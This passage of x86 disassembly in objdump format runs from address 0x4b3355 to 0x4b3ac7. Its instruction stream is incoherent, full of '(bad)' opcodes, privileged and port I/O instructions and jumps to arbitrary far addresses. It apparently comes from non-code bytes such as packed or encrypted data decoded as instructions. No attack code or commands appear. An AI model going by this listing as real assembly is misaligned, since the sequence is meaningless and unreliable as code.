  4b3355:	imul   ebx,DWORD PTR [edi+0x61bd1877],0x60
  4b335c:	inc    ebx
  4b335d:	push   ebx
  4b335e:	jmp    0x4b3363
  4b3360:	(bad)  
  4b3361:	dec    esi
  4b3362:	push   ecx
  4b3363:	mov    bl,BYTE PTR [edi+0x75]
  4b3366:	addr16 ret 0xb001
  4b336a:	aad    0x56
  4b336c:	push   0x20
  4b336e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b336f:	sbb    dh,al
  4b3371:	xchg   ebp,eax
  4b3372:	daa    
  4b3373:	mov    bh,0xa
  4b3375:	hlt    
  4b3376:	xchg   al,cl
  4b3378:	pop    eax
  4b3379:	clc    
  4b337a:	retf   0x4ac0
  4b337d:	ins    DWORD PTR es:[edi],dx
  4b337e:	loop   0x4b3350
  4b3380:	push   ebp
  4b3381:	xor    BYTE PTR [eax-0x2f498740],dh
  4b3387:	iret   
  4b3388:	add    DWORD PTR [edi],ebx
  4b338a:	call   0x510b:0xdf7c4e00
  4b3391:	push   0x9e2daf03
  4b3396:	add    ebx,DWORD PTR [ebp-0x20dba4a6]
  4b339c:	arpl   WORD PTR ds:0x82444125,ax
  4b33a2:	cmp    DWORD PTR [edi+ecx*1],ecx
  4b33a5:	xchg   BYTE PTR [ecx+0x36e0c04b],dh
  4b33ab:	and    DWORD PTR [edx],esp
  4b33ad:	push   esi
  4b33ae:	dec    esp
  4b33af:	pop    esp
  4b33b0:	stc    
  4b33b1:	xchg   esp,eax
  4b33b2:	and    BYTE PTR [ebx-0x7d],al
  4b33b5:	add    BYTE PTR ds:[esi+0x5],bl
  4b33b9:	fistp  WORD PTR [eax-0x3dbba8f5]
  4b33bf:	dec    edi
  4b33c0:	dec    esp
  4b33c1:	out    0x94,al
  4b33c3:	push   eax
  4b33c4:	nop    DWORD PTR [edx-0x74]
  4b33c8:	xor    ah,BYTE PTR [ebp+0x56b869f1]
  4b33ce:	adc    DWORD PTR [eax+ecx*2],esi
  4b33d1:	lods   al,BYTE PTR ds:[esi]
  4b33d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b33d3:	dec    edi
  4b33d4:	jecxz  0x4b3392
  4b33d6:	push   es
  4b33d7:	and    BYTE PTR ds:0xec32c4c9,bh
  4b33dd:	ins    BYTE PTR es:[edi],dx
  4b33de:	adc    DWORD PTR [eax],ebp
  4b33e0:	adc    dh,cl
  4b33e2:	and    cl,ah
  4b33e4:	jbe    0x4b33fd
  4b33e6:	mov    dl,0x56
  4b33e8:	xor    BYTE PTR [ecx-0x7197ea65],al
  4b33ee:	add    ebx,DWORD PTR [edi]
  4b33f0:	push   ebx
  4b33f1:	push   esi
  4b33f2:	call   DWORD PTR [edi+0x205b238c]
  4b33f8:	jp     0x4b3403
  4b33fa:	jne    0x4b3401
  4b33fc:	inc    ebx
  4b33fd:	mov    DWORD PTR [edi],ebx
  4b33ff:	jmp    0x4b3459
  4b3401:	adc    bh,BYTE PTR [eax]
  4b3403:	out    dx,eax
  4b3404:	in     eax,0x3b
  4b3406:	pop    esi
  4b3407:	inc    esi
  4b3408:	push   0x6a
  4b340a:	xor    esp,ebp
  4b340c:	in     eax,0x0
  4b340e:	or     al,0x48
  4b3410:	sqrtps xmm4,XMMWORD PTR [ebx+0x10]
  4b3414:	jp     0x4b3482
  4b3416:	cmc    
  4b3417:	nop
  4b3418:	popf   
  4b3419:	xor    al,0xd7
  4b341b:	movhps QWORD PTR [ecx],xmm0
  4b341e:	cdq    
  4b341f:	xchg   ebx,eax
  4b3420:	pop    eax
  4b3421:	xor    edx,ebp
  4b3423:	pop    edi
  4b3424:	jne    0x4b3443
  4b3426:	push   esi
  4b3427:	and    BYTE PTR [esp+esi*2+0xf3a721c],dl
  4b342e:	pop    ecx
  4b342f:	cmp    eax,0x8437a090
  4b3434:	dec    esp
  4b3435:	xor    DWORD PTR [ebx-0x79499220],edi
  4b343b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b343c:	sub    BYTE PTR [ebp-0x4b],dh
  4b343f:	adc    BYTE PTR [esp+ebp*8-0x76],bh
  4b3443:	sbb    DWORD PTR [ebx-0x4b],edx
  4b3446:	pop    ebx
  4b3447:	je     0x4b3491
  4b3449:	add    eax,0x17201c98
  4b344e:	and    BYTE PTR [esp+ebx*8],ch
  4b3451:	or     DWORD PTR [eax+0x75dfa808],ebx
  4b3457:	jge    0x4b347b
  4b3459:	or     dl,al
  4b345b:	rcl    DWORD PTR [eax],0x61
  4b345e:	cmp    BYTE PTR [ecx+0x9],dl
  4b3461:	and    ebx,ebp
  4b3463:	mov    dh,0x51
  4b3465:	fnstsw WORD PTR [esi-0x42]
  4b3468:	in     al,dx
  4b3469:	jns    0x4b347b
  4b346b:	inc    esi
  4b346c:	div    edi
  4b346e:	push   eax
  4b346f:	pop    ss
  4b3470:	mov    ebx,0x3791d438
  4b3475:	push   eax
  4b3476:	lock cmp al,0xca
  4b3479:	mov    ebx,DWORD PTR [ecx+0x324c834]
  4b347f:	add    edi,esi
  4b3481:	aam    0xad
  4b3483:	loop   0x4b348c
  4b3485:	(bad)  
  4b3486:	jae    0x4b348a
  4b3488:	pop    ss
  4b3489:	jmp    0x6030:0xaaeec0c
  4b3490:	and    al,0xf2
  4b3492:	sub    edi,DWORD PTR [ebx]
  4b3494:	repnz loopne 0x4b34c1
  4b3497:	push   ebx
  4b3498:	xor    eax,0x7c658209
  4b349d:	and    al,0xf1
  4b349f:	adc    eax,0x58bbbc20
  4b34a4:	and    eax,0x5275f149
  4b34a9:	and    ah,dl
  4b34ab:	inc    esi
  4b34ac:	mov    al,0xc1
  4b34ae:	lea    eax,[ebx-0x18]
  4b34b1:	jge    0x4b34f0
  4b34b3:	push   ss
  4b34b4:	and    BYTE PTR [ebp-0x7557d490],dl
  4b34ba:	call   0x747d1703
  4b34bf:	push   cs
  4b34c0:	mov    bh,0x7e
  4b34c2:	jo     0x4b3527
  4b34c4:	mov    ebp,0x1cf7ca53
  4b34c9:	mov    ecx,DWORD PTR [ebx-0x4]
  4b34cc:	hlt    
  4b34cd:	(bad)  
  4b34ce:	mov    bh,0xfd
  4b34d0:	dec    ebx
  4b34d1:	pop    edx
  4b34d2:	mov    ebx,DWORD PTR [ecx+eax*4]
  4b34d5:	sti    
  4b34d6:	fsubr  DWORD PTR [eax]
  4b34d8:	xchg   esi,eax
  4b34d9:	jl     0x4b348d
  4b34db:	fwait
  4b34dc:	jecxz  0x4b34db
  4b34de:	and    al,0x85
  4b34e0:	mov    DWORD PTR [ebx+0x3de73d50],ecx
  4b34e6:	add    bh,BYTE PTR [esi]
  4b34e8:	mov    dl,0x75
  4b34ea:	push   ebp
  4b34eb:	or     bh,bh
  4b34ed:	or     DWORD PTR [esi],esi
  4b34ef:	and    bl,dl
  4b34f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b34f2:	(bad)  
  4b34f3:	mov    edx,0x490e244d
  4b34f8:	push   esi
  4b34f9:	loop   0x4b347e
  4b34fb:	sub    BYTE PTR [eax+ebx*1+0x16ab414],bh
  4b3502:	mov    esp,0xaee5a3ad
  4b3507:	inc    eax
  4b3508:	jl     0x4b34ea
  4b350a:	je     0x4b3511
  4b350c:	mov    eax,ds:0x19a4057
  4b3511:	xchg   ebx,eax
  4b3512:	outs   dx,BYTE PTR ds:[esi]
  4b3513:	pop    eax
  4b3514:	scas   eax,DWORD PTR es:[edi]
  4b3515:	enter  0x3bd2,0x10
  4b3519:	add    eax,0xb61e891c
  4b351e:	xchg   edx,eax
  4b351f:	jle    0x4b34e7
  4b3521:	jecxz  0x4b34d9
  4b3523:	mov    cl,0x75
  4b3525:	dec    edi
  4b3526:	xor    BYTE PTR [eax],ch
  4b3528:	dec    ebp
  4b3529:	mov    bh,0x44
  4b352b:	inc    esp
  4b352c:	aad    0x28
  4b352e:	out    0xf6,al
  4b3530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b3531:	addr16 jl 0x4b355d
  4b3534:	pop    eax
  4b3535:	and    al,0x8
  4b3537:	add    al,0x74
  4b3539:	pop    ds
  4b353a:	rcl    edx,0x9a
  4b353d:	adc    ah,bh
  4b353f:	or     BYTE PTR [eax],dl
  4b3541:	sahf   
  4b3542:	dec    edx
  4b3543:	sbb    al,0xc1
  4b3545:	pusha  
  4b3546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b3547:	fisttp WORD PTR [eax]
  4b3549:	mov    edi,eax
  4b354b:	add    DWORD PTR [eax+0x4e24d121],eax
  4b3551:	psrlq  mm5,QWORD PTR [edx+0x2a1801c3]
  4b3558:	adc    dl,BYTE PTR [edi-0x7b]
  4b355b:	xor    dh,ch
  4b355d:	push   edx
  4b355e:	aas    
  4b355f:	sbb    al,0x2a
  4b3561:	push   eax
  4b3562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b3563:	sbb    al,ch
  4b3565:	inc    BYTE PTR [ebx]
  4b3567:	lock not DWORD PTR [eax+0x12]
  4b356b:	cmp    al,0x13
  4b356d:	test   BYTE PTR ds:0x1bb3689,0x74
  4b3574:	out    dx,al
  4b3575:	mov    DWORD PTR [ecx+edx*1],esi
  4b3578:	sub    eax,0x5c299c20
  4b357d:	adc    DWORD PTR [edx+0x63],edx
  4b3580:	std    
  4b3581:	mov    dh,0x4
  4b3583:	and    eax,DWORD PTR [ebp+0x11]
  4b3586:	or     BYTE PTR [edx],dh
  4b3588:	push   es
  4b3589:	call   0xe2c1:0xad4893b8
  4b3590:	add    eax,0x897401a4
  4b3595:	mov    al,ds:0xe4d68f02
  4b359a:	jg     0x4b35a1
  4b359c:	sbb    eax,0xcb7a66a0
  4b35a1:	imul   eax,ecx
  4b35a4:	add    ebp,DWORD PTR [ecx+0x42]
  4b35a7:	or     BYTE PTR [eax-0x4909d530],bh
  4b35ad:	push   esp
  4b35ae:	xchg   esp,eax
  4b35af:	push   ss
  4b35b0:	test   al,0xf1
  4b35b2:	push   esp
  4b35b3:	xor    dh,bh
  4b35b5:	dec    BYTE PTR [eax]
  4b35b7:	jle    0x4b3577
  4b35b9:	adc    al,0xae
  4b35bb:	nop
  4b35bc:	jb     0x4b35bd
  4b35be:	cs push esp
  4b35c0:	(bad)  
  4b35c2:	dec    esi
  4b35c3:	or     eax,0x9c2e0308
  4b35c8:	jb     0x4b35c8
  4b35ca:	and    al,0x4
  4b35cc:	xor    eax,0xb2720988
  4b35d1:	in     eax,dx
  4b35d2:	ror    DWORD PTR [ebp+0x1155b9ba],0x58
  4b35d9:	shl    BYTE PTR [edi],0x52
  4b35dc:	push   ecx
  4b35dd:	pop    edi
  4b35de:	and    DWORD PTR [ebx-0x7d],ecx
  4b35e1:	jbe    0x4b3638
  4b35e3:	mov    esi,0xc25880a
  4b35e8:	jle    0x4b363a
  4b35ea:	push   0x287d223b
  4b35ef:	mov    edx,ecx
  4b35f1:	add    BYTE PTR [edi+0x20],dl
  4b35f4:	or     al,0xa3
  4b35f6:	xor    DWORD PTR [ebx+0x14],0x16
  4b35fa:	or     eax,ecx
  4b35fc:	out    dx,al
  4b35fd:	dec    ebp
  4b35fe:	jo     0x4b3644
  4b3600:	xor    bl,BYTE PTR [eax+ebp*1]
  4b3603:	push   es
  4b3604:	inc    ecx
  4b3605:	add    edx,0x20
  4b3608:	dec    edi
  4b3609:	jl     0x4b35f0
  4b360b:	pop    es
  4b360c:	mov    al,0x60
  4b360e:	pusha  
  4b360f:	xchg   esp,eax
  4b3610:	call   0x34eb:0xfc08360c
  4b3617:	clc    
  4b3618:	pusha  
  4b3619:	int    0x46
  4b361b:	in     al,0xbf
  4b361d:	pop    eax
  4b361e:	adc    BYTE PTR [ebx-0x4dda1fd2],0x20
  4b3625:	sub    bl,cl
  4b3627:	(bad)  
  4b3628:	retf   
  4b3629:	mov    al,0x38
  4b362b:	adc    DWORD PTR [eax-0x48],ecx
  4b362e:	add    al,BYTE PTR [esp+eiz*2]
  4b3631:	mov    al,ds:0x151a9ad
  4b3636:	test   BYTE PTR [edx-0x14569f93],0xa2
  4b363d:	pop    edi
  4b363e:	mov    eax,ebx
  4b3640:	pop    ecx
  4b3641:	(bad)
  4b3645:	and    al,BYTE PTR [ebx+0x3a]
  4b3648:	sub    al,0x78
  4b364a:	rcl    ecx,0x10
  4b364d:	fisttp QWORD PTR [ebp+0x18]
  4b3650:	ror    BYTE PTR [ecx+0x7315a507],1
  4b3656:	sbb    BYTE PTR [ecx+0x18],bh
  4b3659:	xchg   ecx,eax
  4b365a:	mov    DWORD PTR [edi+0x8],esi
  4b365d:	pop    edx
  4b365e:	lahf   
  4b365f:	mov    bl,0x14
  4b3661:	dec    eax
  4b3662:	xor    BYTE PTR [eax],al
  4b3664:	sub    edx,DWORD PTR [edx*1-0x5af3dcba]
  4b366b:	shl    ecx,1
  4b366d:	or     dl,cl
  4b366f:	js     0x4b35f2
  4b3671:	or     al,0x5b
  4b3673:	fild   WORD PTR [ebx]
  4b3675:	call   0xfbfcc71a
  4b367a:	cmp    eax,0xc32056d3
  4b367f:	xor    eax,0xed4fcf78
  4b3684:	call   0x1c39:0x5bd6267c
  4b368b:	icebp  
  4b368c:	add    al,0x86
  4b368e:	pop    eax
  4b368f:	in     eax,dx
  4b3690:	mov    ebx,0x7f7ab484
  4b3695:	sbb    DWORD PTR [esi+0x47],ebx
  4b3698:	push   0x22
  4b369a:	adc    esp,esp
  4b369c:	fimul  DWORD PTR [esi+0x53]
  4b369f:	cs or  al,0xf0
  4b36a2:	daa    
  4b36a3:	mov    edi,0x3e0455cc
  4b36a8:	or     DWORD PTR [esi],0xc0a13d89
  4b36ae:	neg    DWORD PTR [ecx+0x68e83118]
  4b36b4:	call   0xd2335f9
  4b36b9:	add    ch,BYTE PTR [edx]
  4b36bb:	push   ebp
  4b36bc:	sub    al,ch
  4b36be:	or     eax,0xc2035b57
  4b36c3:	in     al,dx
  4b36c4:	adc    BYTE PTR [ebp+0x2d],bh
  4b36c7:	ds (bad) 
  4b36c9:	out    dx,al
  4b36ca:	fiadd  DWORD PTR [edi-0x50]
  4b36cd:	xor    ch,BYTE PTR [ebx]
  4b36cf:	mov    ds:0x38005032,eax
  4b36d4:	fdivr  DWORD PTR [ebx+0x23ca0650]
  4b36da:	push   0xf663492c
  4b36df:	add    eax,0xbf47304a
  4b36e4:	ret    
  4b36e5:	push   0x2232b50
  4b36ea:	sbb    BYTE PTR [ecx],al
  4b36ec:	cmp    DWORD PTR [ecx],esi
  4b36ee:	inc    ecx
  4b36ef:	add    DWORD PTR [edx+ebp*2+0xd6c6a33],ecx
  4b36f6:	and    BYTE PTR [eax+0x50423b2d],al
  4b36fc:	sbb    BYTE PTR [ecx-0x3f],ah
  4b36ff:	xor    bl,bl
  4b3701:	fistp  QWORD PTR [ecx-0x3f72457d]
  4b3707:	jmp    0x1b3:0xdc652e04
  4b370e:	mov    edx,0x3e5321d2
  4b3713:	or     eax,0xec2c740a
  4b3718:	rol    DWORD PTR [ebx],0xd4
  4b371b:	call   0x5157b7b9
  4b3720:	push   ecx
  4b3721:	in     eax,0x55
  4b3723:	mov    al,ds:0xc9e1474
  4b3728:	or     dh,BYTE PTR [ebp+ecx*1+0x60]
  4b372c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b372d:	add    ch,BYTE PTR [ebp-0x61ba52c5]
  4b3733:	or     DWORD PTR [ebx+0x8],edx
  4b3736:	repz out 0x7f,eax
  4b3739:	leave  
  4b373a:	sbb    ah,al
  4b373c:	loope  0x4b37b2
  4b373e:	mov    edx,0x21763839
  4b3743:	call   0xb578b8a6
  4b3748:	push   ebp
  4b3749:	or     BYTE PTR [ebp+0xa950752],dh
  4b374f:	ret    0x239d
  4b3752:	jmp    0x347f:0x484f2c53
  4b3759:	inc    edi
  4b375a:	cmp    edi,DWORD PTR [ecx]
  4b375c:	jb     0x4b3738
  4b375e:	or     eax,DWORD PTR [edx+0x15035ca0]
  4b3764:	out    dx,al
  4b3765:	and    al,0x3
  4b3767:	jbe    0x4b37be
  4b3769:	mov    eax,ds:0x192cc44
  4b376e:	add    edx,DWORD PTR [edx-0x15]
  4b3771:	nop
  4b3772:	js     0x4b3769
  4b3774:	and    BYTE PTR ds:0x928918ed,ch
  4b377a:	cmp    edi,0x4d
  4b377d:	repz jo 0x4b379b
  4b3780:	mov    ss,WORD PTR [edi-0x58ecf9f0]
  4b3786:	test   eax,0xea032e6c
  4b378b:	add    BYTE PTR [ecx+eiz*8],al
  4b378e:	xor    al,dh
  4b3790:	or     eax,0x2004118
  4b3795:	popa   
  4b3796:	inc    ebp
  4b3797:	cdq    
  4b3798:	xchg   BYTE PTR [edx+eax*4],bh
  4b379b:	add    ebx,edx
  4b379d:	std    
  4b379e:	jl     0x4b372c
  4b37a0:	xor    al,0xbd
  4b37a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b37a3:	pop    ecx
  4b37a4:	imul   esp,eax,0x3c
  4b37a7:	mov    ds:0x5efc69a,eax
  4b37ac:	sub    dl,bh
  4b37ae:	push   0x2c
  4b37b0:	mov    cl,0xa5
  4b37b2:	or     al,0xc0
  4b37b4:	jg     0x4b380d
  4b37b6:	sbb    eax,DWORD PTR [eax]
  4b37b8:	sbb    BYTE PTR [ecx+ebp*8],cl
  4b37bb:	and    BYTE PTR [edx+0x2c],al
  4b37be:	and    bh,ch
  4b37c0:	adc    esi,edx
  4b37c2:	or     esp,DWORD PTR [edx+ebp*1]
  4b37c5:	push   0x35
  4b37c7:	add    dh,ah
  4b37c9:	xor    DWORD PTR [ecx-0x3cb36cef],eax
  4b37cf:	add    BYTE PTR [ebx*4+0x6a16c5dc],dl
  4b37d6:	or     BYTE PTR ds:0xc3b58d5a,dl
  4b37dc:	imul   DWORD PTR [ebx+eiz*1+0x35]
  4b37e0:	pusha  
  4b37e1:	lods   eax,DWORD PTR ds:[esi]
  4b37e2:	out    dx,al
  4b37e3:	popa   
  4b37e4:	out    dx,eax
  4b37e5:	sbb    ah,al
  4b37e7:	inc    edx
  4b37e8:	(bad)  
  4b37ea:	ret    0xbee5
  4b37ed:	clts   
  4b37ef:	mov    al,ds:0xd401815c
  4b37f4:	mov    edx,ecx
  4b37f6:	add    BYTE PTR [eax+0x0],dh
  4b37f9:	inc    ebx
  4b37fa:	into   
  4b37fb:	aas    
  4b37fc:	das    
  4b37fd:	jb     0x4b37ef
  4b37ff:	lods   al,BYTE PTR ds:[esi]
  4b3800:	or     DWORD PTR [edx+0x60182ef7],0x49c418ad
  4b380a:	push   edx
  4b380b:	cdq    
  4b380c:	adc    DWORD PTR [ecx-0x65abf760],0xe6d8461
  4b3816:	jne    0x4b3866
  4b3818:	jae    0x4b3862
  4b381a:	cmp    al,0xf1
  4b381c:	or     ecx,DWORD PTR es:[edi]
  4b381f:	loop   0x4b37df
  4b3821:	mov    ecx,?
  4b3823:	jmp    0x4b3858
  4b3825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b3826:	jb     0x4b3895
  4b3828:	xlat   BYTE PTR ds:[ebx]
  4b3829:	cld    
  4b382a:	mov    eax,0x4722eb1b
  4b382f:	sub    al,0x7c
  4b3831:	cwde   
  4b3832:	or     ebx,ebx
  4b3834:	cmp    DWORD PTR [edi],ecx
  4b3836:	sbb    esp,DWORD PTR [edx+0x210d85a4]
  4b383c:	or     al,0x4b
  4b383e:	xchg   BYTE PTR [edi+0x3a],ah
  4b3841:	rol    BYTE PTR [ebp-0x1801e8b8],0x4
  4b3848:	push   es
  4b3849:	outs   dx,DWORD PTR ds:[esi]
  4b384a:	ret    
  4b384b:	push   edx
  4b384c:	jb     0x4b380a
  4b384e:	mov    BYTE PTR [ecx+0x482887d6],dl
  4b3854:	add    DWORD PTR [ecx+ebx*1],esp
  4b3857:	pop    edi
  4b3858:	loope  0x4b38ca
  4b385a:	cmp    ecx,DWORD PTR [eax-0x15]
  4b385d:	or     eax,0x1c494838
  4b3862:	enter  0x9098,0x91
  4b3866:	fdiv   DWORD PTR [edx]
  4b3868:	loopne 0x4b3866
  4b386a:	push   esi
  4b386b:	jb     0x4b38b5
  4b386d:	mov    dl,BYTE PTR [esp+ebp*8]
  4b3870:	add    edi,DWORD PTR [esp+eax*4-0x292cc43c]
  4b3877:	xor    bh,dh
  4b3879:	out    0x3,eax
  4b387b:	adc    ebx,DWORD PTR [edx]
  4b387d:	loope  0x4b3884
  4b387f:	or     eax,0x38262692
  4b3884:	pop    ss
  4b3885:	add    BYTE PTR [edi],0x9e
  4b3888:	inc    ebp
  4b3889:	mov    cl,0x0
  4b388b:	cmp    al,0x84
  4b388d:	fist   WORD PTR [edx+0x31068b2c]
  4b3893:	or     al,0xe0
  4b3895:	repnz sbb bl,BYTE PTR [ebx]
  4b3898:	pushf  
  4b3899:	sbb    al,0xf2
  4b389b:	in     al,dx
  4b389c:	sahf   
  4b389d:	xlat   BYTE PTR ds:[ebx]
  4b389e:	cmp    al,0x44
  4b38a0:	jp     0x4b38a4
  4b38a2:	das    
  4b38a3:	xor    al,BYTE PTR [esi+0x36]
  4b38a6:	js     0x4b387a
  4b38a8:	int3   
  4b38a9:	jo     0x4b389c
  4b38ab:	jne    0x4b38d9
  4b38ad:	in     eax,dx
  4b38ae:	imul   edx,DWORD PTR [edx+edx*2-0x30],0x2742b0ce
  4b38b6:	je     0x4b38be
  4b38b8:	add    BYTE PTR [esi+eax*4-0x381499a9],ch
  4b38bf:	shl    DWORD PTR [ecx],0xf2
  4b38c2:	adc    dh,BYTE PTR [ecx+0x45108647]
  4b38c8:	mov    DWORD PTR [ecx],eax
  4b38ca:	pop    eax
  4b38cb:	pop    esp
  4b38cc:	adc    DWORD PTR [ecx-0x7d],esp
  4b38cf:	fild   QWORD PTR [edx-0x6926c3ce]
  4b38d5:	mov    ds:0x39825351,eax
  4b38da:	push   cs
  4b38db:	arpl   WORD PTR [ecx],dx
  4b38dd:	aad    0xf1
  4b38df:	xor    edi,DWORD PTR [edi]
  4b38e1:	(bad)  
  4b38e2:	pop    esi
  4b38e3:	xor    al,0x3a
  4b38e5:	pop    es
  4b38e6:	jl     0xbb865112
  4b38ec:	ror    BYTE PTR [ecx],1
  4b38ee:	sbb    al,0x8f
  4b38f0:	sbb    al,BYTE PTR [edi-0x4bd45669]
  4b38f6:	mov    ebx,0x7076d5b4
  4b38fb:	jle    0x4b3899
  4b38fd:	or     dh,al
  4b38ff:	retf   0x20f9
  4b3902:	popa   
  4b3903:	add    eax,0x7913e010
  4b3908:	test   DWORD PTR [esp+ebx*1],esp
  4b390b:	jle    0x4b3974
  4b390d:	push   es
  4b390e:	sbb    ebp,DWORD PTR [edx]
  4b3910:	sub    al,0xe4
  4b3912:	add    BYTE PTR [ecx+0x1827af25],al
  4b3918:	sar    DWORD PTR [eax-0x4e],0x9f
  4b391c:	jno    0x4b38f6
  4b391e:	fnsave [edi-0x307cf9f8]
  4b3924:	jl     0x4b399d
  4b3926:	(bad)  
  4b3927:	fimul  WORD PTR [esi+0x2660e341]
  4b392d:	xor    eax,0xc8458bf6
  4b3932:	retf   0x390e
  4b3935:	adc    DWORD PTR [ebp+0x4d],esi
  4b3938:	cmp    BYTE PTR [ecx-0x1c],0xb6
  4b393c:	(bad)  
  4b393d:	push   ebx
  4b393e:	shl    BYTE PTR [ebp+0xa],1
  4b3941:	mov    ch,0xea
  4b3943:	cmp    eax,0x88a439eb
  4b3948:	int    0xc7
  4b394a:	xor    eax,0xc60f258c
  4b394f:	push   0xfca5a084
  4b3954:	mov    edi,0x4c8da325
  4b3959:	mov    esp,0x749d6a26
  4b395e:	mov    esp,DWORD PTR [ebp+0x2d]
  4b3961:	fist   DWORD PTR [esi-0x35dffb49]
  4b3967:	pop    ebx
  4b3968:	les    esi,FWORD PTR [edx]
  4b396a:	sub    DWORD PTR [ebx-0x76],ebp
  4b396d:	dec    edi
  4b396e:	das    
  4b396f:	out    dx,eax
  4b3970:	mov    ah,0xe4
  4b3972:	cmp    edi,DWORD PTR [esi-0x6b]
  4b3975:	rol    DWORD PTR [esi],1
  4b3977:	jae    0x4b3911
  4b3979:	dec    ebp
  4b397a:	pusha  
  4b397b:	mov    WORD PTR fs:[edi],gs
  4b397e:	stc    
  4b397f:	and    ebx,DWORD PTR [ebx]
  4b3981:	in     al,0xf7
  4b3983:	inc    DWORD PTR [eax]
  4b3985:	cwde   
  4b3986:	(bad)  
  4b3987:	or     BYTE PTR [esi+0x57],dl
  4b398a:	xchg   ecx,eax
  4b398b:	mov    BYTE PTR [eax],dh
  4b398d:	mov    eax,0x8247f30d
  4b3992:	mov    es,WORD PTR [edx+0x64]
  4b3995:	add    al,0x70
  4b3997:	cmp    DWORD PTR [ecx],0x41
  4b399a:	repnz lahf 
  4b399c:	vprotq xmm10,xmm4,0x13
  4b39a1:	es into 
  4b39a3:	or     DWORD PTR [eax-0x68],0x5c
  4b39a7:	and    dh,BYTE PTR [esi+0x67]
  4b39aa:	lea    edi,[eax-0x73]
  4b39ad:	mov    dl,0xc5
  4b39af:	out    dx,eax
  4b39b0:	push   cs
  4b39b1:	or     BYTE PTR [eax-0x3d],cl
  4b39b4:	addr16 mov ebx,0xc384241d
  4b39ba:	lods   eax,DWORD PTR ds:[esi]
  4b39bb:	mov    al,ds:0x130ae2a8
  4b39c0:	xor    BYTE PTR [edi],al
  4b39c2:	pusha  
  4b39c3:	push   cs
  4b39c4:	jmp    0x4b3a22
  4b39c6:	test   DWORD PTR [ecx],ebp
  4b39c8:	push   ds
  4b39c9:	sub    al,0x68
  4b39cb:	push   eax
  4b39cc:	jp     0x4b39fa
  4b39ce:	jns    0x4b3a30
  4b39d0:	lods   eax,DWORD PTR ds:[esi]
  4b39d1:	das    
  4b39d2:	push   es
  4b39d3:	inc    edi
  4b39d4:	dec    ebp
  4b39d5:	adc    al,0xd0
  4b39d7:	xor    BYTE PTR [ebx-0x7baefbc5],0xaa
  4b39de:	sub    DWORD PTR [eax],ebp
  4b39e0:	into   
  4b39e1:	mov    dl,0xf1
  4b39e3:	mov    WORD PTR [esi+0xf60007],gs
  4b39e9:	loope  0x4b39da
  4b39eb:	dec    ecx
  4b39ec:	and    al,0x46
  4b39ee:	and    eax,0x4d9c4862
  4b39f3:	push   ss
  4b39f4:	test   eax,0xbf3f8096
  4b39f9:	add    cl,BYTE PTR [edi+ecx*1]
  4b39fc:	xor    eax,eax
  4b39fe:	inc    edx
  4b39ff:	mov    BYTE PTR [esi-0x6a],0xa6
  4b3a03:	xchg   esp,eax
  4b3a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b3a05:	add    bh,BYTE PTR [esi]
  4b3a07:	xor    bl,BYTE PTR [edx+0x1d]
  4b3a0a:	dec    ebx
  4b3a0b:	jp     0x4b399f
  4b3a0d:	lock (bad) 
  4b3a0f:	sub    eax,0xbc568896
  4b3a14:	sub    al,0x98
  4b3a16:	fsub   DWORD PTR [esi]
  4b3a18:	adc    edx,DWORD PTR [edi+0x33]
  4b3a1b:	add    DWORD PTR [eax+eiz*4+0x4dc0c64a],0x4d9fa02
  4b3a26:	sbb    al,0xba
  4b3a28:	mov    ebx,gs
  4b3a2a:	and    al,0x66
  4b3a2c:	nop
  4b3a2d:	aam    0x19
  4b3a2f:	or     ebp,ecx
  4b3a31:	mov    DWORD PTR [eax],ecx
  4b3a33:	xor    ebx,DWORD PTR [ebp-0x3b]
  4b3a36:	inc    esi
  4b3a37:	aas    
  4b3a38:	jge    0x4b3a56
  4b3a3a:	pushf  
  4b3a3b:	or     ebx,DWORD PTR ds:0x2156ca02
  4b3a41:	jne    0x4b3a1f
  4b3a43:	add    DWORD PTR [edx-0x54],ecx
  4b3a46:	jnp    0x4b3a5e
  4b3a48:	or     al,BYTE PTR cs:[ecx-0x17]
  4b3a4c:	aas    
  4b3a4d:	call   0x8b23:0x7cfc2808
  4b3a54:	add    edi,DWORD PTR [ecx]
  4b3a56:	pop    esp
  4b3a57:	enter  0xc249,0xa6
  4b3a5b:	ja     0x4b3ab7
  4b3a5d:	sub    al,0xdc
  4b3a5f:	or     DWORD PTR [edx],esi
  4b3a61:	inc    ecx
  4b3a62:	lea    edx,[eax-0x4]
  4b3a65:	xchg   cl,al
  4b3a67:	inc    edx
  4b3a68:	add    edx,DWORD PTR [eax+0x700aa7e]
  4b3a6e:	inc    ebx
  4b3a6f:	push   ebp
  4b3a70:	(bad)  
  4b3a71:	sbb    BYTE PTR [ebx+0x5],bl
  4b3a74:	pop    ds
  4b3a75:	dec    esp
  4b3a76:	or     al,0x7e
  4b3a78:	cmp    DWORD PTR [ebp+ecx*4+0x6b],0x34a8a3f1
  4b3a80:	mov    DWORD PTR [ebx-0x53ae452c],edi
  4b3a86:	sbb    BYTE PTR [ecx+0x557121f6],al
  4b3a8c:	mov    eax,0x18d67c61
  4b3a91:	pop    DWORD PTR [eax+0x59]
  4b3a94:	push   es
  4b3a95:	shl    DWORD PTR [ebp-0x3f3b0cbd],1
  4b3a9b:	xchg   edi,eax
  4b3a9c:	sbb    ch,ch
  4b3a9e:	pop    ecx
  4b3a9f:	xor    BYTE PTR [edx],dh
  4b3aa1:	sar    DWORD PTR [esi+edx*2+0x6dc30c1c],cl
  4b3aa8:	imul   ecx,DWORD PTR [ebx+ebp*8],0x1c1a7016
  4b3aaf:	sbb    BYTE PTR [esi+0x7bbed408],al
  4b3ab5:	leave  
  4b3ab6:	(bad)  
  4b3ab7:	das    
  4b3ab8:	mov    esi,0x5c71c75
  4b3abd:	loopne 0x4b3aed
  4b3abf:	or     esp,ebp
  4b3ac1:	mov    al,0x8d
  4b3ac3:	add    DWORD PTR [ebp+0x58],ebx
  4b3ac6:	dec    eax
  4b3ac7:	xchg   edi,eax
